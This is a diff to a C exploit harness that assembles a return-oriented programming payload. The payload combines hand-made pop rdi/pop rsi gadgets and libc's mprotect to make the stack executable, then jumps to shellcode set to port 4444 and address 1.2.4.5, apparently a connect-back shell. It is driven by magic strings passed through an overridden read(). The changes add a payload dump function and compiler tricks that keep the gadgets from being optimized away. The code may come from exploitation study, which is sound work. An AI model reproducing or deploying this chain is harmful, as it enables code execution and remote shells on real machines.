@@ -37,6 +37,7 @@ static const char *s_magic = "xyzzy";
 static const char *s_populate = "POPULATE";
 static const char *s_disclose = "DISCLOSE";
 static const char *s_overflow = "OVERFLOW";
+static const char *s_dumpload = "DUMPLOAD";
 static const char *s_testload = "TESTLOAD";
 
 static const char *s_libc_base     = "base";
@@ -113,28 +114,34 @@ static void populate(PayloadPtr plp) {
 
 	ptrdiff_t libc_mprotect_offset = libc_mprotect - libc_base;
 
-	plp->pl_popRDI = &&l_poprdi;
-	plp->pl_stackStart = stackBase();
-	plp->pl_popRSI = &&l_poprsi;
-	plp->pl_stackSize = getpagesize();
-	plp->pl_permission = 0x7;
-	plp->pl_mprotect = libc_mprotect;
-	plp->pl_shellCode = &plp->scu; // Must be updated when overflowed onto stack (to reflect new scu address on stack)
+	plp->pl_popRDI		= &&l_poprdi;
+	plp->pl_stackStart	= stackBase();
+	plp->pl_popRSI		= &&l_poprsi;
+	plp->pl_stackSize	= getpagesize();
+	plp->pl_permission	= 0x7;
+	plp->pl_mprotect	= libc_mprotect;
+	plp->pl_shellCode	= &plp->scu; // Must be updated whenever *plp moves
 
-	plp->scu.sc.port = htons(4444);
-	plp->scu.sc.address[0] = 1;
-	plp->scu.sc.address[1] = 2;
-	plp->scu.sc.address[2] = 4;
-	plp->scu.sc.address[3] = 5;
+	plp->scu.sc.port	= htons(4444);
+	plp->scu.sc.address[0]	= 1;
+	plp->scu.sc.address[1]	= 2;
+	plp->scu.sc.address[2]	= 4;
+	plp->scu.sc.address[3]	= 5;
 
-	return;
+	// The conditional return below keeps the optimizer from removing the tail (that I need for a couple of gadgets
+	if (plp != NULL)
+		return;
 
+	// The following code is a hack to give us a couple of gadgets (referenced above as &&l_poprdi and &&l_poprsi)
+	// The code should never be reached under normal conditions, so the optimizer wants to cull it out.
+	// The conditional return above (which always executes) keeps the gadgets from being optimized out, but...
+	// Is there a better way to tell the optimizer to lay-off the rest of the function and leave it around?
 l_poprdi:
-	__asm__("pop rdi");
-	__asm__("ret");
+	__asm__ __volatile__ ("pop %rdi");
+	__asm__ __volatile__ ("ret");
 l_poprsi:
-	__asm__("pop rsi");
-	__asm__("ret");
+	__asm__ __volatile__ ("pop %rsi");
+	__asm__ __volatile__ ("ret");
 } // populate()
 
 static void disclose(PayloadPtr plp) {
@@ -155,6 +162,20 @@ static void disclose(PayloadPtr plp) {
 	printf("address: %d.%d.%d.%d\n", plp->scu.sc.address[0], plp->scu.sc.address[1], plp->scu.sc.address[2], plp->scu.sc.address[3]);
 	printf("--------------------------------------------\n");
 } // disclose()
+
+static void dumpload(PayloadPtr plp) {
+	printf("In dumpload()\n");
+
+	printf("--------------------------------------------\n");
+	printf("%20s: %p\n",           "pl_popRDI",       plp->pl_popRDI);
+	printf("%20s: %p\n",           "pl_stackStart",   plp->pl_stackStart);
+	printf("%20s: %p\n",           "pl_popRSI",       plp->pl_popRSI);
+	printf("%20s: %tx\n",          "pl_stackSize",    plp->pl_stackSize);
+	printf("%20s: %tx\n",          "pl_permission",   plp->pl_permission);
+	printf("%20s: %p\n",           "pl_mprotect",     plp->pl_mprotect);
+	printf("%20s: %p\n",           "pl_shellCode",    plp->pl_shellCode);
+	printf("--------------------------------------------\n");
+} // dumpload()
 
 static void testload(PayloadPtr plp) {
 	char dst[8] = {0};
@@ -187,6 +208,8 @@ ssize_t read(int fd, void *buf, size_t count) {
 			populate(&payload);
 		else if (!strncmp(s_disclose, p, strlen(s_disclose)))
 			disclose(&payload);
+		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
+			dumpload(&payload);
 		else if (!strncmp(s_testload, p, strlen(s_testload)))
 			testload(&payload);
 		else if (!strncmp(s_overflow, p, strlen(s_overflow)))
@@ -210,6 +233,6 @@ int main(int argc, char **argv)
 
 	populate(&payload);
 	disclose(&payload);
+	dumpload(&payload);
 	testload(&payload);
-}
-
+} // main()
